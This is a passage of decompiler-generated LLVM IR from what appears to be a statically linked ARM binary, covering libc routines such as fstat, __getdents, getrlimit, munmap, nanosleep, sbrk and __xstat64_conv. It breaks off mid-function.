define i32 @fstat() local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %v0_16e80 = load i32, i32* @r1, align 4
  store i32 %v0_16e80, i32* @r3, align 4
  store i32 197, i32* %r7.global-to-local, align 4
  %v0_16e90 = load i32, i32* @r0, align 4
  store i32 %v0_16e90, i32* @r2, align 4
  %tmp = icmp ult i32 %v0_16e90, -4095
  br i1 %tmp, label %dec_label_pc_16eb8, label %dec_label_pc_16e9c

dec_label_pc_16e9c:                               ; preds = %entry
  %v0_16ea0 = call i32 @__aeabi_read_tp()
  %v3_16ea4 = load i16, i16* @global_var_24150.533, align 2
  %v4_16ea4 = sext i16 %v3_16ea4 to i32
  store i32 %v4_16ea4, i32* @r3, align 4
  %v0_16ea8 = load i32, i32* @r2, align 4
  %v1_16ea8 = sub i32 0, %v0_16ea8
  store i32 %v1_16ea8, i32* @r2, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v3_16eb0 = add i32 %v4_16ea4, %v0_16ea0
  %v4_16eb0 = inttoptr i32 %v3_16eb0 to i32*
  store i32 %v1_16ea8, i32* %v4_16eb0, align 4
  br label %dec_label_pc_16ec8

dec_label_pc_16eb8:                               ; preds = %entry
  store i32 %v0_16e90, i32* %r7.global-to-local, align 4
  %v2_16eb8 = icmp eq i32 %v0_16e90, 0
  br i1 %v2_16eb8, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_16eb8
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_16eb8, %bb
  call void @__pseudo_cond_branch(i1 %v2_16eb8, i32 ptrtoint (i32* @global_var_17308.774 to i32))
  br label %dec_label_pc_16ec8

dec_label_pc_16ec8:                               ; preds = %dec_label_pc_16e9c, %.thread
  %v0_16ec8 = load i32, i32* %r7.global-to-local, align 4
  ret i32 %v0_16ec8

; uselistorder directives
  uselistorder i32 %v0_16e90, { 1, 2, 0, 3 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_16ec8, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__getdents(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %v6_16edc = load i32, i32* @r5, align 4
  %v18_16edc = load i32, i32* @sl, align 4
  store i32 141, i32* %r7.global-to-local, align 4
  store i32 %arg1, i32* @r5, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_16f14, label %dec_label_pc_16ef8

dec_label_pc_16ef8:                               ; preds = %entry
  %v1_16efc = sub i32 0, %arg1
  %v3_16f00 = load i16, i16* @global_var_24150.533, align 2
  %v4_16f00 = sext i16 %v3_16f00 to i32
  store i32 %v4_16f00, i32* %r3.global-to-local, align 4
  %v0_16f04 = call i32 @__aeabi_read_tp()
  store i32 -1, i32* @r5, align 4
  %v3_16f0c = add i32 %v4_16f00, %v0_16f04
  %v4_16f0c = inttoptr i32 %v3_16f0c to i32*
  store i32 %v1_16efc, i32* %v4_16f0c, align 4
  br label %dec_label_pc_16f68

dec_label_pc_16f14:                               ; preds = %entry
  br i1 false, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_16f14
  store i32 %arg2, i32* %r7.global-to-local, align 4
  %v3_16f1c = add i32 %arg2, %arg1
  store i32 %v3_16f1c, i32* @sl, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_16f14, %bb
  %v1_16f584 = phi i32 [ %v18_16edc, %dec_label_pc_16f14 ], [ %v3_16f1c, %bb ]
  %v0_16f542 = phi i32 [ 141, %dec_label_pc_16f14 ], [ %arg2, %bb ]
  br i1 false, label %dec_label_pc_16f68, label %dec_label_pc_16f54

dec_label_pc_16f28:                               ; preds = %dec_label_pc_16f54
  %v1_16f5c = inttoptr i32 %v1_16f54 to i8*
  %v1_16f28 = add i32 %v0_16f28, 8
  %v2_16f28 = inttoptr i32 %v1_16f28 to i16*
  %v3_16f28 = load i16, i16* %v2_16f28, align 2
  %v4_16f28 = zext i16 %v3_16f28 to i32
  %v2_16f2c = add i32 %v4_16f28, %v0_16f28
  store i32 %v2_16f2c, i32* @r3, align 4
  %v1_16f30 = add i32 %v2_16f2c, -1
  %v2_16f30 = inttoptr i32 %v1_16f30 to i8*
  %v3_16f30 = load i8, i8* %v2_16f30, align 1
  %v4_16f30 = zext i8 %v3_16f30 to i32
  store i32 %v4_16f30, i32* @r4, align 4
  %v3_16f34 = call i32 @strlen(i8* %v1_16f5c)
  %v0_16f38 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_16f38, i32* @r1, align 4
  %v1_16f3c = add i32 %v3_16f34, 1
  store i32 %v1_16f3c, i32* @r2, align 4
  %v0_16f40 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_16f40, i32* @r0, align 4
  %v3_16f44 = call i32 @memmove(i32 %v0_16f40, i32 %v0_16f38, i32 %v1_16f3c)
  %v0_16f48 = load i32, i32* %r7.global-to-local, align 4
  %v1_16f48 = add i32 %v0_16f48, 8
  %v2_16f48 = inttoptr i32 %v1_16f48 to i16*
  %v3_16f48 = load i16, i16* %v2_16f48, align 2
  %v4_16f48 = zext i16 %v3_16f48 to i32
  store i32 %v4_16f48, i32* %r3.global-to-local, align 4
  %v0_16f4c = load i32, i32* @r4, align 4
  %v1_16f4c = trunc i32 %v0_16f4c to i8
  %v3_16f4c = add i32 %v0_16f48, 10
  %v4_16f4c = inttoptr i32 %v3_16f4c to i8*
  store i8 %v1_16f4c, i8* %v4_16f4c, align 1
  %v0_16f50 = load i32, i32* %r7.global-to-local, align 4
  %v1_16f50 = load i32, i32* %r3.global-to-local, align 4
  %v2_16f50 = add i32 %v1_16f50, %v0_16f50
  store i32 %v2_16f50, i32* %r7.global-to-local, align 4
  %v1_16f58.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_16f54

dec_label_pc_16f54:                               ; preds = %.thread, %dec_label_pc_16f28
  %v1_16f58 = phi i32 [ %v1_16f58.pre, %dec_label_pc_16f28 ], [ %v1_16f584, %.thread ]
  %v0_16f28 = phi i32 [ %v2_16f50, %dec_label_pc_16f28 ], [ %v0_16f542, %.thread ]
  %v1_16f54 = add i32 %v0_16f28, 10
  store i32 %v1_16f54, i32* %r6.global-to-local, align 4
  %v3_16f58 = icmp ult i32 %v0_16f28, %v1_16f58
  %v1_16f60 = add i32 %v0_16f28, 11
  store i32 %v1_16f60, i32* %r8.global-to-local, align 4
  br i1 %v3_16f58, label %dec_label_pc_16f28, label %dec_label_pc_16f68

dec_label_pc_16f68:                               ; preds = %dec_label_pc_16f54, %.thread, %dec_label_pc_16ef8
  %v0_16f68 = load i32, i32* @r5, align 4
  store i32 %v6_16edc, i32* @r5, align 4
  store i32 %v18_16edc, i32* @sl, align 4
  ret i32 %v0_16f68

; uselistorder directives
  uselistorder i32 %v1_16f54, { 1, 0 }
  uselistorder i32 %v0_16f28, { 2, 4, 3, 1, 0 }
  uselistorder i32 %v18_16edc, { 1, 0 }
  uselistorder i32* %r8.global-to-local, { 1, 0 }
  uselistorder i32* %r7.global-to-local, { 0, 2, 3, 1, 4 }
  uselistorder i32* %r6.global-to-local, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @memmove, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_16f54, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @getdtablesize() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v2_16f80 = ptrtoint i32* %stack_var_-16 to i32
  %v2_16f8c = call i32 @getrlimit(i32 7, i32 %v2_16f80)
  %v1_16f90 = icmp slt i32 %v2_16f8c, 0
  %v5_16f94 = load i32, i32* %stack_var_-16, align 4
  %storemerge = select i1 %v1_16f90, i32 256, i32 %v5_16f94
  ret i32 %storemerge
}

define i32 @getegid() local_unnamed_addr {
entry:
  %v1_16fb8 = load i32, i32* @r0, align 4
  ret i32 %v1_16fb8
}

define i32 @geteuid() local_unnamed_addr {
entry:
  %v1_16fcc = load i32, i32* @r0, align 4
  ret i32 %v1_16fcc
}

define i32 @getgid(i32 %arg1) local_unnamed_addr {
entry:
  %v1_16fe0 = load i32, i32* @r0, align 4
  ret i32 %v1_16fe0
}

define i32 @__GI_getpagesize() local_unnamed_addr {
entry:
  %v4_16ff0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32 148) to i32*), align 4
  %v1_16ff4 = inttoptr i32 %v4_16ff0 to i32*
  %v2_16ff4 = load i32, i32* %v1_16ff4, align 4
  %v2_16ff8 = icmp eq i32 %v2_16ff4, 0
  br i1 %v2_16ff8, label %bb, label %bb2

bb:                                               ; preds = %entry
  br label %bb2

bb2:                                              ; preds = %entry, %bb
  %v1_17000 = phi i32 [ %v2_16ff4, %entry ], [ 4096, %bb ]
  ret i32 %v1_17000

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @getrlimit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_17038, label %dec_label_pc_17020

dec_label_pc_17020:                               ; preds = %entry
  %v1_17024 = sub i32 0, %arg1
  %v3_17028 = load i16, i16* @global_var_24150.533, align 2
  %v4_17028 = sext i16 %v3_17028 to i32
  %v0_1702c = call i32 @__aeabi_read_tp()
  %v3_17030 = add i32 %v4_17028, %v0_1702c
  %v4_17030 = inttoptr i32 %v3_17030 to i32*
  store i32 %v1_17024, i32* %v4_17030, align 4
  br label %dec_label_pc_17038

dec_label_pc_17038:                               ; preds = %entry, %dec_label_pc_17020
  %v1_1703c = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_17020 ]
  ret i32 %v1_1703c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_17038, { 1, 0 }
}

define i32 @gettimeofday(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_17044 = load i32, i32* @r7, align 4
  store i32 %v3_17044, i32* %stack_var_-8, align 4
  %v0_17050 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_17050, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_17050, -4095
  br i1 %tmp, label %dec_label_pc_17078, label %dec_label_pc_17060

dec_label_pc_17060:                               ; preds = %entry
  %v0_17064 = call i32 @__aeabi_read_tp()
  %v3_17068 = load i16, i16* @global_var_24150.533, align 2
  %v4_17068 = sext i16 %v3_17068 to i32
  store i32 %v4_17068, i32* @r3, align 4
  %v0_1706c = load i32, i32* %r2.global-to-local, align 4
  %v1_1706c = sub i32 0, %v0_1706c
  store i32 %v1_1706c, i32* %r2.global-to-local, align 4
  %v3_17070 = add i32 %v4_17068, %v0_17064
  %v4_17070 = inttoptr i32 %v3_17070 to i32*
  store i32 %v1_1706c, i32* %v4_17070, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_17078.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_17078

dec_label_pc_17078:                               ; preds = %entry, %dec_label_pc_17060
  %v1_1707c = phi i32 [ %v0_17050, %entry ], [ -1, %dec_label_pc_17060 ]
  %v2_17078 = phi i32 [ %v3_17044, %entry ], [ %v2_17078.pre, %dec_label_pc_17060 ]
  store i32 %v2_17078, i32* @r7, align 4
  ret i32 %v1_1707c

; uselistorder directives
  uselistorder i32 %v0_17050, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_17078, { 1, 0 }
}

define i32 @getuid() local_unnamed_addr {
entry:
  %v1_17094 = load i32, i32* @r0, align 4
  ret i32 %v1_17094
}

define i32 @mremap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_17098 = load i32, i32* @r4, align 4
  store i32 %v3_17098, i32* %stack_var_-12, align 4
  %v0_170a8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_170a8, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_170a8, -4095
  br i1 %tmp, label %dec_label_pc_170d0, label %dec_label_pc_170b8

dec_label_pc_170b8:                               ; preds = %entry
  %v0_170bc = call i32 @__aeabi_read_tp()
  %v3_170c0 = load i16, i16* @global_var_24150.533, align 2
  %v4_170c0 = sext i16 %v3_170c0 to i32
  %v0_170c4 = load i32, i32* %r2.global-to-local, align 4
  %v1_170c4 = sub i32 0, %v0_170c4
  store i32 %v1_170c4, i32* %r2.global-to-local, align 4
  %v3_170c8 = add i32 %v4_170c0, %v0_170bc
  %v4_170c8 = inttoptr i32 %v3_170c8 to i32*
  store i32 %v1_170c4, i32* %v4_170c8, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_170d0.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_170d0

dec_label_pc_170d0:                               ; preds = %entry, %dec_label_pc_170b8
  %v1_170d4 = phi i32 [ %v0_170a8, %entry ], [ -1, %dec_label_pc_170b8 ]
  %v2_170d0 = phi i32 [ %v3_17098, %entry ], [ %v2_170d0.pre, %dec_label_pc_170b8 ]
  store i32 %v2_170d0, i32* @r4, align 4
  ret i32 %v1_170d4

; uselistorder directives
  uselistorder i32 %v0_170a8, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_170d0, { 1, 0 }
}

define i32 @munmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_170dc = load i32, i32* @r7, align 4
  store i32 %v3_170dc, i32* %stack_var_-8, align 4
  %v0_170e8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_170e8, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_170e8, -4095
  br i1 %tmp, label %dec_label_pc_17110, label %dec_label_pc_170f8

dec_label_pc_170f8:                               ; preds = %entry
  %v0_170fc = call i32 @__aeabi_read_tp()
  %v3_17100 = load i16, i16* @global_var_24150.533, align 2
  %v4_17100 = sext i16 %v3_17100 to i32
  %v0_17104 = load i32, i32* %r2.global-to-local, align 4
  %v1_17104 = sub i32 0, %v0_17104
  store i32 %v1_17104, i32* %r2.global-to-local, align 4
  %v3_17108 = add i32 %v4_17100, %v0_170fc
  %v4_17108 = inttoptr i32 %v3_17108 to i32*
  store i32 %v1_17104, i32* %v4_17108, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_17110.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_17110

dec_label_pc_17110:                               ; preds = %entry, %dec_label_pc_170f8
  %v1_17114 = phi i32 [ %v0_170e8, %entry ], [ -1, %dec_label_pc_170f8 ]
  %v2_17110 = phi i32 [ %v3_170dc, %entry ], [ %v2_17110.pre, %dec_label_pc_170f8 ]
  store i32 %v2_17110, i32* @r7, align 4
  ret i32 %v1_17114

; uselistorder directives
  uselistorder i32 %v0_170e8, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_17110, { 1, 0 }
}

define i32 @__syscall_nanosleep() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1711c = load i32, i32* @r7, align 4
  store i32 %v3_1711c, i32* %stack_var_-8, align 4
  %v0_17128 = load i32, i32* @r0, align 4
  store i32 %v0_17128, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_17128, -4095
  br i1 %tmp, label %dec_label_pc_17150, label %dec_label_pc_17138

dec_label_pc_17138:                               ; preds = %entry
  %v0_1713c = call i32 @__aeabi_read_tp()
  %v3_17140 = load i16, i16* @global_var_24150.533, align 2
  %v4_17140 = sext i16 %v3_17140 to i32
  %v0_17144 = load i32, i32* %r2.global-to-local, align 4
  %v1_17144 = sub i32 0, %v0_17144
  store i32 %v1_17144, i32* %r2.global-to-local, align 4
  %v3_17148 = add i32 %v4_17140, %v0_1713c
  %v4_17148 = inttoptr i32 %v3_17148 to i32*
  store i32 %v1_17144, i32* %v4_17148, align 4
  %v2_17150.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_17150

dec_label_pc_17150:                               ; preds = %entry, %dec_label_pc_17138
  %v1_17154 = phi i32 [ %v0_17128, %entry ], [ -1, %dec_label_pc_17138 ]
  %v2_17150 = phi i32 [ %v3_1711c, %entry ], [ %v2_17150.pre, %dec_label_pc_17138 ]
  store i32 %v2_17150, i32* @r7, align 4
  ret i32 %v1_17154

; uselistorder directives
  uselistorder i32 %v0_17128, { 1, 0, 2 }
  uselistorder label %dec_label_pc_17150, { 1, 0 }
}

define i32 @__libc_nanosleep(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v4_17168 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32 12972) to i32*), align 4
  %v2_1716c = icmp eq i32 %v4_17168, 0
  %v3_17170 = load i32, i32* @r4, align 4
  %v9_17170 = load i32, i32* @r6, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  br i1 %v2_1716c, label %dec_label_pc_17180, label %entry.dec_label_pc_17188_crit_edge

entry.dec_label_pc_17188_crit_edge:               ; preds = %entry
  br label %dec_label_pc_17188

dec_label_pc_17180:                               ; preds = %entry
  store i32 %v3_17170, i32* @r4, align 4
  store i32 %v9_17170, i32* @r6, align 4
  %v0_17184 = call i32 @__syscall_nanosleep()
  br label %dec_label_pc_17188

dec_label_pc_17188:                               ; preds = %entry.dec_label_pc_17188_crit_edge, %dec_label_pc_17180
  %v0_17188 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_17188, i32* @r5, align 4
  %v0_17194 = load i32, i32* @r4, align 4
  store i32 %v0_17194, i32* @r0, align 4
  %v0_17198 = call i32 @__syscall_nanosleep()
  store i32 %v0_17198, i32* @r4, align 4
  %v0_171a0 = load i32, i32* @r5, align 4
  %v1_171a4 = call i32 @__libc_disable_asynccancel(i32 %v0_171a0)
  %v0_171a8 = load i32, i32* @r4, align 4
  ret i32 %v0_171a8

; uselistorder directives
  uselistorder i32 (i32)* @__libc_disable_asynccancel, { 8, 6, 13, 1, 7, 10, 5, 9, 4, 3, 12, 2, 11, 0 }
  uselistorder i32 ()* @__libc_enable_asynccancel, { 8, 6, 13, 1, 7, 10, 5, 9, 4, 3, 12, 2, 11, 0 }
  uselistorder label %dec_label_pc_17188, { 1, 0 }
}

define i32 @__GI_sbrk(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_171bc = load i32, i32* @r4, align 4
  store i32 %v3_171bc, i32* %stack_var_-16, align 4
  store i32 11604, i32* %r6.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32* %r4.global-to-local, align 4
  %v4_171cc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32 11604) to i32*), align 4
  %v2_171d0 = icmp eq i32 %v4_171cc, 0
  store i32 %arg1, i32* %r5.global-to-local, align 4
  br i1 %v2_171d0, label %dec_label_pc_171dc, label %dec_label_pc_171ec

dec_label_pc_171dc:                               ; preds = %entry
  %v1_171e0 = call i32 @__GI_brk(i32 0)
  %v1_171e4 = icmp slt i32 %v1_171e0, 0
  br i1 %v1_171e4, label %dec_label_pc_17210, label %dec_label_pc_171ecthread-pre-split

dec_label_pc_171ecthread-pre-split:               ; preds = %dec_label_pc_171dc
  %v0_171f0.pr = load i32, i32* %r5.global-to-local, align 4
  %v0_171ec.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_171ec.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_171ec

dec_label_pc_171ec:                               ; preds = %dec_label_pc_171ecthread-pre-split, %entry
  %v1_171ec = phi i32 [ %v1_171ec.pre, %dec_label_pc_171ecthread-pre-split ], [ 11604, %entry ]
  %v0_171ec = phi i32 [ %v0_171ec.pre, %dec_label_pc_171ecthread-pre-split ], [ ptrtoint (i32* @global_var_240f8.537 to i32), %entry ]
  %v1_17200 = phi i32 [ %v0_171f0.pr, %dec_label_pc_171ecthread-pre-split ], [ %arg1, %entry ]
  %v2_171ec = add i32 %v0_171ec, %v1_171ec
  %v3_171ec = inttoptr i32 %v2_171ec to i32*
  %v4_171ec = load i32, i32* %v3_171ec, align 4
  %v2_171f0 = icmp eq i32 %v1_17200, 0
  store i32 %v4_171ec, i32* %r4.global-to-local, align 4
  br i1 %v2_171f0, label %dec_label_pc_17214, label %dec_label_pc_171fc

dec_label_pc_171fc:                               ; preds = %dec_label_pc_171ec
  %v2_17200 = add i32 %v4_171ec, %v1_17200
  %v1_17204 = call i32 @__GI_brk(i32 %v2_17200)
  %v1_17208 = icmp slt i32 %v1_17204, 0
  br i1 %v1_17208, label %dec_label_pc_17210, label %dec_label_pc_171fc.dec_label_pc_17214_crit_edge

dec_label_pc_171fc.dec_label_pc_17214_crit_edge:  ; preds = %dec_label_pc_171fc
  %v0_17214.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_17214

dec_label_pc_17210:                               ; preds = %dec_label_pc_171fc, %dec_label_pc_171dc
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_17214

dec_label_pc_17214:                               ; preds = %dec_label_pc_171ec, %dec_label_pc_171fc.dec_label_pc_17214_crit_edge, %dec_label_pc_17210
  %v0_17214 = phi i32 [ %v0_17214.pre, %dec_label_pc_171fc.dec_label_pc_17214_crit_edge ], [ -1, %dec_label_pc_17210 ], [ %v4_171ec, %dec_label_pc_171ec ]
  %v2_17218 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_17218, i32* @r4, align 4
  ret i32 %v0_17214

; uselistorder directives
  uselistorder i32 %v4_171ec, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_brk, { 1, 0 }
  uselistorder label %dec_label_pc_17214, { 2, 1, 0 }
}

define i32 @times(i32 %arg1) local_unnamed_addr {
entry:
  %v1_17238 = load i32, i32* @r0, align 4
  ret i32 %v1_17238
}

define i32 @__xstat64_conv(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_1723c = load i32, i32* @r4, align 4
  store i32 %v3_1723c, i32* %stack_var_-24, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  store i32 %tmp, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 104, i32* %r2.global-to-local, align 4
  %v3_17254 = inttoptr i32 %arg2 to i8*
  %v4_17254 = call i32 @__GI_memset(i8* %v3_17254, i32 0, i32 104)
  %v2_17258 = load i32, i32* %arg1, align 4
  store i32 %v2_17258, i32* %r3.global-to-local, align 4
  %v3_17258 = add i32 %tmp, 4
  %v4_17258 = inttoptr i32 %v3_17258 to i32*
  %v5_17258 = load i32, i32* %v4_17258, align 4
  store i32 %v5_17258, i32* %r4.global-to-local, align 4
  %v0_1725c = load i32, i32* %r5.global-to-local, align 4
  %v1_1725c = inttoptr i32 %v0_1725c to i32*
  store i32 %v2_17258, i32* %v1_1725c, align 4
  %v3_1725c = add i32 %v0_1725c, 4
  %v4_1725c = inttoptr i32 %v3_1725c to i32*
  %v5_1725c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_1725c, i32* %v4_1725c, align 4
  %v0_17260 = load i32, i32* %r6.global-to-local, align 4
  %v1_17260 = add i32 %v0_17260, 12
  %v2_17260 = inttoptr i32 %v1_17260 to i32*
  %v3_17260 = load i32, i32* %v2_17260, align 4
  %v1_17264 = load i32, i32* %r5.global-to-local, align 4
  %v2_17264 = add i32 %v1_17264, 12
  %v3_17264 = inttoptr i32 %v2_17264 to i32*
  store i32 %v3_17260, i32* %v3_17264, align 4
  %v0_17268 = load i32, i32* %r6.global-to-local, align 4
  %v1_17268 = add i32 %v0_17268, 96
  store i32 %v1_17268, i32* %r3.global-to-local, align 4
  %v1_1726c = inttoptr i32 %v1_17268 to i32*
  %v2_1726c = load i32, i32* %v1_1726c, align 4
  store i32 %v2_1726c, i32* %r3.global-to-local, align 4
  %v3_1726c = add i32 %v0_17268, 100
  %v4_1726c = inttoptr i32 %v3_1726c to i32*
  %v5_1726c = load i32, i32* %v4_1726c, align 4
  store i32 %v5_1726c, i32* %r4.global-to-local, align 4
  %v1_17270 = add i32 %v0_17268, 56
  %v2_17270 = inttoptr i32 %v1_17270 to i32*
  %v3_17270 = load i32, i32* %v2_17270, align 4
  store i32 %v3_17270, i32* %r2.global-to-local, align 4
  %v1_17274 = load i32, i32* %r5.global-to-local, align 4
  %v2_17274 = add i32 %v1_17274, 96
  %v3_17274 = inttoptr i32 %v2_17274 to i32*
  store i32 %v2_1726c, i32* %v3_17274, align 4
  %v0_17278 = load i32, i32* %r4.global-to-local, align 4
  %v1_17278 = load i32, i32* %r5.global-to-local, align 4
  %v2_17278 = add i32 %v1_17278, 100
  %v3_17278 = inttoptr i32 %v2_17278 to i32*
  store i32 %v0_17278, i32* %v3_17278, align 4
  %v0_1727c = load i32, i32* %r6.global-to-local, align 4
  %v1_1727c = add i32 %v0_1727c, 24
  store i32 %v1_1727c, i32* %ip.global-to-local, align 4
  %v1_17280 = inttoptr i32 %v1_1727c to i32*
  %v2_17280 = load i32, i32* %v1_17280, align 4
  store i32 %v2_17280, i32* %ip.global-to-local, align 4
  %v3_17280 = add i32 %v0_1727c, 28
  %v4_17280 = inttoptr i32 %v3_17280 to i32*
  %v5_17280 = load i32, i32* %v4_17280, align 4
  store i32 %v5_17280, i32* %lr.global-to-local, align 4
  %v0_17284 = load i32, i32* %r2.global-to-local, align 4
  %v1_17284 = load i32, i32* %r5.global-to-local, align 4
  %v2_17284 = add i32 %v1_17284, 56
  %v3_17284 = inttoptr i32 %v2_17284 to i32*
  store i32 %v0_17284, i32* %v3_17284, align 4
  %v0_17288 = load i32, i32* %r6.global-to-local, align 4
  %v1_17288 = add i32 %v0_17288, 72
  store i32 %v1_17288, i32* %r3.global-to-local, align 4
  %v1_1728c = add i32 %v0_17288, 32
  store i32 %v1_1728c, i32* %r7.global-to-local, align 4
  %v1_17290 = inttoptr i32 %v1_1728c to i32*
  %v2_17290 = load i32, i32* %v1_17290, align 4
  store i32 %v2_17290, i32* %r7.global-to-local, align 4
  %v3_17290 = add i32 %v0_17288, 36
  %v4_17290 = inttoptr i32 %v3_17290 to i32*
  %v5_17290 = load i32, i32* %v4_17290, align 4
  store i32 %v5_17290, i32* %r8.global-to-local, align 4
  %v1_17294 = inttoptr i32 %v1_17288 to i32*
  %v2_17294 = load i32, i32* %v1_17294, align 4
  %v3_17294 = add i32 %v0_17288, 76
  %v4_17294 = inttoptr i32 %v3_17294 to i32*
  %v5_17294 = load i32, i32* %v4_17294, align 4
  store i32 %v5_17294, i32* %r1.global-to-local, align 4
  %v0_17298 = load i32, i32* %r5.global-to-local, align 4
  %v1_17298 = add i32 %v0_17298, 72
  %v1_1729c = inttoptr i32 %v1_17298 to i32*
  store i32 %v2_17294, i32* %v1_1729c, align 4
  %v3_1729c = add i32 %v0_17298, 76
  %v4_1729c = inttoptr i32 %v3_1729c to i32*
  %v5_1729c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1729c, i32* %v4_1729c, align 4
  %v0_172a0 = load i32, i32* %r7.global-to-local, align 4
  %v1_172a0 = load i32, i32* %r5.global-to-local, align 4
  %v2_172a0 = add i32 %v1_172a0, 32
  %v3_172a0 = inttoptr i32 %v2_172a0 to i32*
  store i32 %v0_172a0, i32* %v3_172a0, align 4
  %v0_172a4 = load i32, i32* %r8.global-to-local, align 4
  %v1_172a4 = load i32, i32* %r5.global-to-local, align 4
  %v2_172a4 = add i32 %v1_172a4, 36
  %v3_172a4 = inttoptr i32 %v2_172a4 to i32*
  store i32 %v0_172a4, i32* %v3_172a4, align 4
  %v0_172a8 = load i32, i32* %r6.global-to-local, align 4
  %v1_172a8 = add i32 %v0_172a8, 80
  store i32 %v1_172a8, i32* %r3.global-to-local, align 4
  %v1_172ac = add i32 %v0_172a8, 48
  store i32 %v1_172ac, i32* %r7.global-to-local, align 4
